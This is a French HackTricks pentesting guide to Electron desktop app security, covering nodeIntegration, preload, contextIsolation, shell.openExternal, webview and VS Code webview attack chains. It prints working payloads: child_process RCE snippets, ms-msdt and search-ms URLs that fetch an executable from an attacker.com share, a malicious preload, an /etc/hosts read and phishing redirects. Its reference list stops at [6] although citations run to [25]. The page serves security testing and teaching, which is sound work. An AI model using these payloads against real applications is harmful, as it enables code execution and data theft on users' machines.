# Applications de bureau Electron

{{#include ../../banners/hacktricks-training.md}}

## Introduction

Electron combine un processus principal **Node.js** privilégié avec des processus de rendu **Chromium**. Electron n’est pas un navigateur web : le code de l’application peut exposer délibérément des capacités telles que l’accès au système de fichiers et au shell. Le chargement de contenu non fiable nécessite donc une conception des frontières plus stricte que pour un site web ordinaire.<sup>[[21]](#references)</sup>

Le code des applications Electron est généralement empaqueté dans une archive `.asar`. Extrayez-la avant d’examiner le code source :

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Le fichier `package.json` de l’application identifie son point d’entrée principal. Ce fichier crée généralement des fenêtres de rendu et définit leurs `webPreferences`, sensibles du point de vue de la sécurité.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron possède deux principaux types de processus :

- Processus principal (dispose d’un accès complet à NodeJS)
- Processus de rendu (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)

![Applications de bureau Electron - Introduction : processus de rendu (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)](<../../images/image (182).png>)

Un **processus de rendu** est une fenêtre de navigateur qui charge un fichier :<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Le **processus principal** configure chaque processus de rendu, généralement lors de la création d’une `BrowserWindow`. Des paramètres sécurisés réduisent le risque qu’une compromission du processus de rendu entraîne l’exécution de code natif, mais ils ne rendent pas intrinsèquement sûr le contenu non fiable.<sup>[[21]](#references)[[22]](#references)</sup>

Examinez au moins ces préférences du processus de rendu :<sup>[[22]](#references)</sup>

- **`nodeIntegration`** est `false` par défaut. L’activer donne au JavaScript du processus de rendu accès aux API Node.js et désactive également le sandbox de ce processus.
- **`contextIsolation`** est `true` par défaut. Cette option sépare le contexte JavaScript de la page de celui utilisé par les scripts preload et les composants internes d’Electron.
- **`preload`** n’a aucun chemin par défaut. Un script preload configuré s’exécute avant les scripts de la page et peut exposer des API à portée limitée via `contextBridge`.
- **`sandbox`** est `true` par défaut depuis Electron 20. Cette option limite l’accès du processus de rendu aux ressources du système d’exploitation ; définir `nodeIntegration: true` la désactive.
- **`nodeIntegrationInWorker`** est `false` par défaut et contrôle l’intégration de Node.js dans les Web Workers.
- **`nodeIntegrationInSubFrames`** est `false` par défaut.
  - Si **`nodeIntegration`** est **activé**, cela permettrait d’utiliser les **API Node.js** dans les pages web **chargées dans des iframes** au sein d’une application Electron.
  - Si **`nodeIntegration`** est **désactivé**, les scripts preload seront chargés dans l’iframe.

Exemple de configuration :

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Quelques **RCE payloads** de [ici](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Capturer le trafic

Modifiez la configuration start-main et ajoutez l’utilisation d’un proxy tel que :

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Traçage statique de la frontière ASAR-vers-native avec REA

**REA** peut lire un ASAR ou un répertoire d’application extrait sans exécuter son bootstrap JavaScript. Son graphe d’application répertorie les points d’entrée des packages, les modules intégrés, les paramètres de `BrowserWindow` et de preload, les membres de `contextBridge`, les enregistrements IPC, les requêtes d’add-ons natifs et les identités des source maps. Cela fournit un point de départ pour tracer une fonctionnalité exposée au renderer jusqu’à un handler privilégié du processus principal.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Pour une chaîne de fonctionnalité littérale, transmettez l’enregistrement Evidence complet comme `application` et remplacez la seed par une valeur observée dans la cible :<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Le même workflow `trace_application_feature` accepte également comme graine un membre d’API littéral observé, un canal IPC ou un module. Vérifiez le chemin du gestionnaire obtenu, les candidats de validation et le relais natif par rapport aux emplacements source renvoyés. Un `invoke` du renderer correspond uniquement à un candidat unique `ipcMain.handle`/`handleOnce` sur le même canal littéral exact ; `send` nécessite de même un candidat unique `ipcMain.on`/`once`/`addListener`. Les gestionnaires dynamiques ou en doublon restent non résolus. Un membre `.node` demandé ne constitue pas un export natif vérifié ; les éléments de preuve Hopper/Ghidra correspondants doivent avoir le même digest d’artefact avant de tirer cette conclusion. La joignabilité statique ne prouve pas non plus que le chemin a été exécuté.<sup>[[24]](#references)[[25]](#references)</sup>

Pour la frontière de confiance entre le renderer et le processus principal, ainsi que la validation des gestionnaires, voir [RCE Electron via IPC avec contextIsolation](electron-contextisolation-rce-via-ipc.md).

Pour le suivi natif lié au fournisseur, voir [Outils de rétro-ingénierie et méthodes de base](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Surface d’attaque de la mise à jour automatique Electron

Pour l’intégrité du flux de publication, les retours arrière, la confusion liée aux canaux signés et les TOCTOU sur les fichiers de staging, voir [Frontières de confiance des mises à jour automatiques Electron](electron-auto-update-trust-boundaries.md).

## Injection de code locale Electron

En cas d’accès en écriture local ou d’instrumentation d’une application installée, voir [Injection de code locale et altération des snapshots dans Electron](electron-local-code-injection-and-snapshot-tampering.md) pour les chemins ASAR/processus principal et snapshot V8, ainsi que les liens spécifiques au système d’exploitation.

## RCE : XSS + nodeIntegration

Si **nodeIntegration** est défini sur **on**, le JavaScript d’une page web peut facilement utiliser les fonctionnalités de Node.js en appelant simplement `require()`. Par exemple, pour exécuter l’application calc sous Windows, procédez ainsi :

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Le script indiqué dans ce paramètre est **chargé avant les autres scripts du renderer**, il a donc **un accès illimité aux API Node**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Par conséquent, le script peut exporter les node-features vers des pages :

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Si `contextIsolation` est activé, cela ne fonctionnera pas**

## RCE : XSS + contextIsolation

Le _**contextIsolation**_ introduit **des contextes séparés entre les scripts de la page Web et le code JavaScript interne d’Electron**, de sorte que l’exécution JavaScript de chaque code n’affecte pas l’autre. C’est une fonctionnalité nécessaire pour éliminer la possibilité d’une RCE.

Si les contextes ne sont pas isolés, un attaquant peut :

1. Exécuter du **JavaScript arbitraire dans le renderer** (XSS ou navigation vers des sites externes)
2. **Remplacer la méthode intégrée** utilisée dans le code preload ou le code interne d’Electron par sa propre fonction
3. **Déclencher** l’utilisation de la **fonction remplacée**
4. RCE ?

Il existe 2 endroits où les méthodes intégrées peuvent être remplacées : dans le code preload ou dans le code interne d’Electron :


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Contournement de l’événement de clic

Si des restrictions s’appliquent lorsque vous cliquez sur un lien, vous pourrez peut-être les contourner **en cliquant avec le bouton central plutôt qu’avec le bouton gauche**.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Pour en savoir plus sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Lors du déploiement d'une application de bureau Electron, il est crucial de configurer correctement `nodeIntegration` et `contextIsolation`. Il est établi que l'exécution de code à distance (RCE) côté client visant les scripts preload ou le code natif d'Electron depuis le processus principal est efficacement empêchée lorsque ces paramètres sont configurés.

Lorsqu'un utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des écouteurs d'événements spécifiques sont déclenchés, essentiels à la sécurité et au fonctionnement de l'application :

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ces écouteurs sont **redéfinis par l’application de bureau** pour implémenter sa propre **logique métier**. L’application détermine si un lien vers lequel l’utilisateur a navigué doit être ouvert en interne ou dans un navigateur web externe. Cette décision est généralement prise au moyen d’une fonction, `openInternally`. Si cette fonction renvoie `false`, cela indique que le lien doit être ouvert en externe, à l’aide de la fonction `shell.openExternal`.

**Voici un pseudocode simplifié :**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Les bonnes pratiques de sécurité d’Electron JS déconseillent d’accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait entraîner une RCE via divers protocoles. Les systèmes d’exploitation prennent en charge différents protocoles susceptibles de déclencher une RCE. Pour des exemples détaillés et de plus amples explications à ce sujet, consultez [cette ressource](https://positive.security/blog/url-open-rce#windows-10-19042), qui présente des exemples de protocoles Windows permettant d’exploiter cette vulnérabilité.<sup>[[10]](#references)</sup>

Sur macOS, la fonction `openExternal` peut être exploitée pour exécuter des commandes arbitraires, comme dans `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Voici des exemples d’exploitation de protocoles Windows :**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Cette vulnérabilité peut être trouvée dans **[ce rapport](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

Le **webviewTag** est une **fonctionnalité obsolète** qui permet d’utiliser **NodeJS** dans le **processus renderer**. Elle devrait être désactivée, car elle permet de charger un script dans le contexte preload, comme ceci :

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Par conséquent, un attaquant qui parvient à charger une page arbitraire pourrait utiliser cette balise pour **charger un script preload arbitraire**.

Ce script preload a ensuite été exploité pour appeler un **service IPC vulnérable (`skype-new-window`)**, qui appelait à son tour **`shell.openExternal`** pour obtenir une RCE :

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lecture de fichiers internes : XSS + contextIsolation

**La désactivation de `contextIsolation` permet d’utiliser des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrer des fichiers locaux. Un exemple montre comment exploiter cette vulnérabilité pour lire le contenu de fichiers internes :<sup>[[2]](#references)</sup>

![RCE : webviewTag + vulnerable preload IPC + shell.openExternal - Lecture de fichiers internes : XSS + contextIsolation : la désactivation de contextIsolation permet d’utiliser des balises , similaires à , pour...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Une autre méthode de **lecture d’un fichier interne** est également présentée, mettant en évidence une vulnérabilité critique de lecture de fichiers locaux dans une application Electron de bureau. Elle consiste à injecter un script pour exploiter l’application et exfiltrer des données :

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE : XSS + ancien Chromium**

Si la version de **Chromium** intégrée à l’application est ancienne et comporte des vulnérabilités connues, il peut être possible de l’exploiter et de transformer une XSS en RCE.<sup>[[20]](#references)</sup>\
Vous trouverez un exemple dans ce **writeup** : [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing par XSS via un contournement de la regex d’URL interne**

Si vous trouvez une XSS, mais que vous **ne pouvez pas déclencher de RCE ni voler des fichiers internes**, vous pouvez tout de même essayer de **voler des identifiants par phishing**.<sup>[[1]](#references)</sup>

Commencez par inspecter le code frontend pour déterminer ce qui se passe lorsqu’une nouvelle URL est ouverte :

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

L’appel à **`openInternally`** détermine si un lien de la plateforme s’ouvre dans la **fenêtre de bureau** ou si une ressource tierce s’ouvre dans le navigateur système.

Si la regex de liste d’autorisations d’URL de la fonction peut être contournée — par exemple, parce que les points d’un nom d’hôte n’ont pas été échappés — un attaquant pourrait exploiter une XSS pour afficher une invite de saisie d’identifiants convaincante sur une infrastructure qu’il contrôle :

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protocole `file://`

Comme indiqué dans [le guide de sécurité d’Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), les pages exécutées sur **`file://`** bénéficient d’un large accès aux fichiers. Par conséquent, **XSS peut permettre de charger des fichiers arbitraires** depuis la machine de l’utilisateur. Un **protocole personnalisé** correctement conçu peut restreindre l’accès à un ensemble précis de fichiers.<sup>[[21]](#references)</sup>

Pour un contournement distinct de la portée des fichiers dans le contexte d’un worker lors de l’affichage d’aperçus par un assistant de bureau, consultez [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Module Remote

Le module Remote d’Electron permet aux **processus de rendu d’accéder aux API du processus principal**, facilitant ainsi la communication au sein d’une application Electron. Cependant, l’activation de ce module introduit d’importants risques de sécurité. Elle élargit la surface d’attaque de l’application, la rendant plus vulnérable à des failles telles que les attaques cross-site scripting (XSS).

> [!TIP]
> Bien que le module **remote** expose certaines API du processus principal aux processus de rendu, il n’est pas si simple d’obtenir une RCE en abusant uniquement des composants. Cependant, les composants peuvent exposer des informations sensibles.

> [!WARNING]
> De nombreuses applications qui utilisent encore le module remote le font d’une manière qui **nécessite l’activation de NodeIntegration** dans le processus de rendu, ce qui constitue un **énorme risque de sécurité**.

Le module `remote` intégré à Electron a été déprécié, puis supprimé ; les applications qui ont encore besoin de ce modèle peuvent utiliser le package distinct `@electron/remote`. En raison des conséquences sur la sécurité et les performances, évitez d’exposer des fonctionnalités de type remote aux processus de rendu non fiables.

Avec `@electron/remote`, il doit d’abord être **initialisé dans le processus principal** :

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Le processus renderer peut alors importer des objets depuis le module :

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

The **[article de blog](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** présente quelques **fonctions** intéressantes exposées par l’objet **`app`** du module remote :<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Redémarre** l’application en **quittant** l’instance actuelle et en **lançant** une nouvelle. Utile pour les **mises à jour de l’application** ou les **changements d’état** importants.
- **`app.setAppLogsPath([path])`**  
   - **Définit** ou **crée** un répertoire pour stocker les **journaux de l’application**. Ces journaux peuvent être **récupérés** ou **modifiés** à l’aide de **`app.getPath()`** ou **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Enregistre** l’exécutable actuel comme **gestionnaire par défaut** d’un **protocole** donné. Vous pouvez fournir un **chemin personnalisé** et des **arguments** si nécessaire.
- **`app.setUserTasks(tasks)`**  
   - **Ajoute** des tâches à la catégorie **Tasks** de la **Jump List** (sous Windows). Chaque tâche peut contrôler le mode de **lancement** de l’application ou les **arguments** transmis.
- **`app.importCertificate(options, callback)`**  
   - **Importe** un **certificat PKCS#12** dans le **magasin de certificats** du système (Linux uniquement). Un **callback** peut être utilisé pour traiter le résultat.
- **`app.moveToApplicationsFolder([options])`**  
   - **Déplace** l’application dans le dossier **Applications** (sous macOS). Cela permet de garantir une **installation standard** aux utilisateurs de Mac.
- **`app.setJumpList(categories)`**  
   - **Définit** ou **supprime** une **Jump List personnalisée** sous **Windows**. Vous pouvez spécifier des **catégories** pour organiser la façon dont les tâches s’affichent pour l’utilisateur.
- **`app.setLoginItemSettings(settings)`**  
   - **Configure** les **exécutables** qui se lancent à la **connexion**, ainsi que leurs **options** (macOS et Windows uniquement).
  
Exemple :

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## module systemPreferences

L’**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Les méthodes comme **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** et **setUserDefault** font toutes **partie de** ce module.

**Exemple d’utilisation :**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Écoute** les **notifications natives de macOS** à l’aide de NSDistributedNotificationCenter.  
* Avant **macOS Catalina**, il était possible d’intercepter **toutes** les notifications distribuées en passant **nil** à CFNotificationCenterAddObserver.  
* Après **Catalina / Big Sur**, les applications sandboxées peuvent toujours **s’abonner** à **de nombreux événements** (par exemple, **verrouillages/déverrouillages de l’écran**, **montages de volumes**, **activité réseau**, etc.) en enregistrant les notifications **par nom**.

### **getUserDefault / setUserDefault**

* **Interface** avec NSUserDefaults, qui stocke les préférences **de l’application** ou **globales** sur macOS.
    
* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements récents de fichiers** ou la **localisation géographique de l’utilisateur**.
    
* **setUserDefault** peut **modifier** ces préférences, ce qui peut affecter la **configuration** d’une application.
    
* Dans les **anciennes versions d’Electron** (antérieures à v8.3.0), seule la **suite standard** de NSUserDefaults était **accessible**.

## Shell.showItemInFolder

Cette fonction affiche le fichier indiqué dans un gestionnaire de fichiers. Sur les plateformes et versions concernées, cette interaction **pouvait exécuter automatiquement le fichier**.

Pour plus d’informations, consultez [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Les applications Electron devraient avoir une **Content Security Policy (CSP)** pour **empêcher les attaques XSS**. La **CSP** est une **norme de sécurité** qui aide à **empêcher** l’**exécution** de **code non fiable** dans le navigateur.

Elle est généralement **configurée** dans le fichier **`main.js`** ou dans le modèle **`index.html`**, avec la CSP dans une **balise meta**.

Pour plus d’informations, consultez :


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE : CSP de webview + confiance en postMessage + chargement de fichiers locaux (VS Code 1.63)

Cette chaîne d’exploitation réelle touchait Visual Studio Code 1.63 (CVE-2021-43908) et montre comment une simple XSS déclenchée par du markdown dans une webview peut être exploitée jusqu’à obtenir une RCE complète lorsque la CSP, postMessage et les gestionnaires de schéma sont mal configurés. PoC publique : https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Vue d’ensemble de la chaîne d’attaque
- Première XSS via la CSP de webview : la CSP générée incluait `style-src 'self' 'unsafe-inline'`, ce qui autorisait l’injection basée sur du code inline ou des styles dans un contexte `vscode-webview://`. Le payload envoyait une requête à `/stealID` pour exfiltrer l’extensionId de la webview cible.
- Construction de l’URL de la webview cible : utilisation de l’ID leaké pour construire `vscode-webview://<extensionId>/.../<publicUrl>`.
- Deuxième XSS via la confiance en postMessage : la webview externe faisait confiance à `window.postMessage` sans vérification stricte de l’origine ou du type et chargeait le HTML de l’attaquant avec `allowScripts: true`.
- Chargement de fichiers locaux via la réécriture du schéma/chemin : le payload réécrivait `file:///...` en `vscode-file://vscode-app/...` et remplaçait `exploit.md` par `RCE.html`, exploitant une validation de chemin faible pour charger une ressource locale privilégiée.
- RCE dans un contexte où Node est activé : le HTML chargé s’exécutait avec les API Node disponibles, permettant l’exécution de commandes du système d’exploitation.

Exemple de primitive RCE dans le contexte final
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Lectures complémentaires sur les problèmes de confiance liés à postMessage :

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev : raccourcis webview synthétiques + ponts déclaratifs de commandes d’extension

Une autre catégorie de contournement des webviews de VS Code est apparue en juin 2026 : **du JavaScript non fiable dans une webview de notebook/aperçu pouvait synthétiser des raccourcis globaux privilégiés**, car le preload de la webview transmettait les données `keydown` au workbench hôte, qui les traitait comme une véritable saisie utilisateur.<sup>[[14]](#references)</sup>

Cela s’inscrit dans une longue histoire d’attaques contre les frontières de confiance des IDE, où du contenu contrôlé par le projet atteint des fonctionnalités privilégiées de l’éditeur.<sup>[[19]](#references)</sup>

### Défaillance de la frontière de confiance

Si une webview sandboxée/d’une origine différente copie des champs clavier contrôlés par l’attaquant (`key`, `code`, `keyCode`, modificateurs, `repeat`) dans un pont privilégié `postMessage`/port de messages **sans vérifier `event.isTrusted`**, le JavaScript exécuté dans la webview peut déclencher les raccourcis du workbench avec :<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

C’est particulièrement utile lorsque **la saisie synthétique est bloquée** par le navigateur. Les événements clavier scriptés ne peuvent généralement **pas saisir de texte arbitraire dans les éléments HTML `<input>`**, mais ils déclenchent toujours les raccourcis qui traitent directement `keydown`.

### Exemples pratiques d’abus

- **Abus de l’interface utilisateur via les raccourcis :** cibler les raccourcis globaux, tels que l’acceptation de notifications, la navigation dans une palette, l’activation du bouton sélectionné ou le déplacement dans un menu, plutôt que d’essayer de saisir des commandes.
- **Invites privilégiées prévisibles à partir des métadonnées de l’espace de travail :** un fichier `.vscode/extensions.json` contrôlé par le dépôt peut recommander une extension malveillante et déclencher une notification d’installation prévisible, qui peut être acceptée avec un raccourci tel que `Ctrl+Shift+A`.
- **Manifeste d’extension déclaratif servant de passerelle vers les commandes :** même si le CSP bloque le code d’une extension locale de l’espace de travail dans VS Code web, les contributions déclaratives de `package.json` peuvent tout de même être chargées. Une extension locale dans `.vscode/extensions` peut enregistrer un raccourci clavier qui appelle `runCommands`, puis une commande interne privilégiée telle que `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Exemple de modèle de manifeste :

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Indicateurs de sécurité cachés accessibles via des métadonnées non fiables :** si la commande interne accepte des arguments contrôlés par un attaquant, tels que `{"context":{"skipPublisherTrust":true}}`, les métadonnées déclaratives peuvent supprimer une boîte de dialogue de confiance et installer une extension hébergée sur le Marketplace/CDN, qui finit par exécuter du code malveillant.
- **Abus de la confiance accordée aux espaces de travail :** si les espaces de travail distants/web sont automatiquement considérés comme fiables, les extensions d’espaces de travail locaux deviennent un relais de grande valeur entre le contenu d’un dépôt et les actions privilégiées de l’éditeur.
- **Amplification de la portée après compromission :** après l’exécution de l’extension, inspectez les jetons que l’éditeur expose aux extensions. Dans `github.dev`, le jeton GitHub volé était valide au-delà du dépôt ouvert ; une requête à `https://api.github.com/user/repos` permettait donc d’énumérer d’autres dépôts privés accessibles.

### Notes d’audit

- Traitez le **transfert des entrées des webviews vers l’hôte** comme une frontière de privilèges ; ne redistribuez jamais vers l’hôte des événements synthétiques de touche/clic provenant de frames non fiables.
- Appliquez l’autorisation **dans les commandes sensibles**. N’acceptez pas de contexte de commande fourni par l’appelant qui peut définir des indicateurs internes tels que `skipPublisherTrust`.
- Ne partez pas du principe que bloquer le code exécutable des extensions locales suffit ; examinez également les **contributions déclaratives** (`keybindings`, `menus`, `commands`, tasks) provenant de manifestes contrôlés par l’espace de travail.
- Les correctifs du 3 juin 2026 ont ajouté `isTrusted` aux événements transférés, désactivé le transfert des touches non fiables dans les webviews de notebook et cessé d’accepter le contexte de commande d’installation fourni par l’appelant.<sup>[[16]](#references)[[17]](#references)</sup>

## **Outils**

La collection sélectionnée **awesome-electronjs-hacking** propose des ressources supplémentaires de recherche, des outils et des applications vulnérables.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil qui détecte les erreurs de configuration et les anti-patterns de sécurité dans les applications basées sur Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) est un plugin open source pour VS Code destiné aux applications Electron, qui utilise Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) vérifie la présence de bibliothèques tierces vulnérables.
- [**Electro.ng**](https://electro.ng/) est un outil commercial d’analyse de sécurité pour Electron.

## Labs

La vidéo [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) présente un lab pour exploiter des applications Electron vulnérables.<sup>[[4]](#references)</sup>

Ces commandes vous aideront à réaliser le lab :

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Ancienne adresse publiée pour les favoris existants : [Applications de bureau Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). L’ancienne route de la page entière redirige ici ; l’ancre historique n’est pas maintenue.

## References

- [1] [Hameçonnage et collecte d’identifiants dans les applications Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Lecture arbitraire de fichiers dans l’application de bureau Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron : exploiter l’absence d’isolation du contexte - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Atelier de hacking des applications de bureau modernes avec XSS et RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - une sélection de ressources sur l’insécurité d’Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Mauvaise utilisation des API Electron : le premier choix d’un attaquant](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
